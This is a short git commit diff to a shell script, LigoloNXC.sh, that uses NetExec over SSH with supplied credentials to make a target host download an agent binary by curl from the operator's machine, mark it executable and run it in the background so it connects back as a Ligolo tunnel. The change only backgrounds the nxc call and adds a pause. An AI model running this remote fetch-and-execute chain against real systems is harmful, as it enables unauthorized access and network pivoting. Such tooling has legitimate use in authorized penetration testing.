d6fecf95f5c54278afd262e02efb2d945899c150
3mi55ary <Gapedwards4@gmail.com>
2025-09-28 17:04:05 -0400

    Update LigoloNXC.sh

--- LigoloNXC.sh
+++ LigoloNXC.sh
@@ -12,7 +12,9 @@ HTTP_PID=$!
 
 # Remote execution via nxc
 CMD="curl -o /dev/shm/agent http://${LOCAL_IP}:9001/agent; chmod +x /dev/shm/agent; nohup bash -c \"/dev/shm/agent -connect ${LOCAL_IP}:11601 -ignore-cert\" & 2>/dev/null"
-nxc ssh "$TARGET_IP" -u "$USERNAME" -p "$PASSWORD" -x "$CMD"
+nxc ssh "$TARGET_IP" -u "$USERNAME" -p "$PASSWORD" -x "$CMD" &
+
+sleep 30
 
 # Kill HTTP server
 sudo kill -9 $HTTP_PID 2>/dev/null
